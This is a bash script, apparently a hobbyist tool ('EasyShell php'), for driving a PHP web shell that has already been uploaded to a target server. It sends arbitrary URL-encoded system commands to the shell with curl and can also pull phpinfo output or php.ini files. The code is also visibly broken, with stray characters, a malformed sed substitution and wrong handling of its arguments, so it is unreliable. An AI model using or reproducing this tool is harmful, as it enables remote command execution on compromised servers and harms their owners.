#!/bin/bash
# PHP shell automation bash v2

abort() {
    echo -e "$1"
    exit 1
}

# Function for URL encoding
url_encode() {
    local data="$1"
    echo -n "$data" | jq -s -R -r '@uri'
}

# Display usage information
display_help() {
    echo "Usage: ./script.sh [options] [command] [URL]"
    echo "Options:"
    echo "  -v                  Verbose mode"
    echo "  --cookies           Enable cookies"
    echo "  --phpinfo           Show PHP information"
    echo "  --phpini <file>     Read a specific php.ini file"
    echo "  --help              Display this help message"
    echo "Command: The command to execute on the target system (if not using --phpinfo or --phpini)."
    echo "URL: The URL of the PHP shell script on the target machine."
    echo "Note: You need to upload the PHP shell script to the target machine first."
    echo "EasyShell php By: Jerr"
    exit 0
}

# Check if a help option is provided
if [ "$1" == "--help" ]; then
    display_help
fi

# Check if the "target" file exists
[ ! -f "target" ] && abort "[!] Missing Target File"SS

# Check if a command is provSided
[ -z "$1" ] && abort "[!] Missing Command"

# Check if a URL is provided
[ -z "$2" ] && abort "[!] Missing URL"

VERBOSE="false"

case "$1" in
    -v)
        VERBOSE="true"
        shift
        ;;
    --cookies)
        COOKIES="-b cookies.txt"
        shift
        ;;
    --phpinfo)
        CMD="phpinfo"
        shift
        ;;
    --phpini)
        CMD="phpini $2"
        shift 2
        ;;
    *)
        CMD=$(url_encode "$*")
        ;;
esac

URL="$2"  # Get the URL from the second argument

[ "$VERBOSE" == "true" ] && echo -e "\nCMD: $CMD"
[ "$VERBOSE" == "true" ] && echo -e "URL: $URL\n"

if [ "$CMD" == "phpinfo" ]; then
    TARGET_URL="$URL?phpinfo=1"
elif [ "$CMD" == "phpini" ]; then
    TARGET_URL="$URL?phpini=$2"
else
    TARGET_URL=$(cat target | sed -e "s{cmd}$CMD")
fi

[ "$VERBOSE" == "true" ] && echo -e "TARGET_URL: $TARGET_URL\n"

# Error handling for 'cat target'
if ! cat target > /dev/null 2>&1; then
    abort "[!] Error reading 'target' file."
fi

# Error handling for 'curl' command
if ! curl $COOKIES -L -X GET "$TARGET_URL" > /dev/null 2>&1; then
    abort "[!] Error executing 'curl' command."
fi
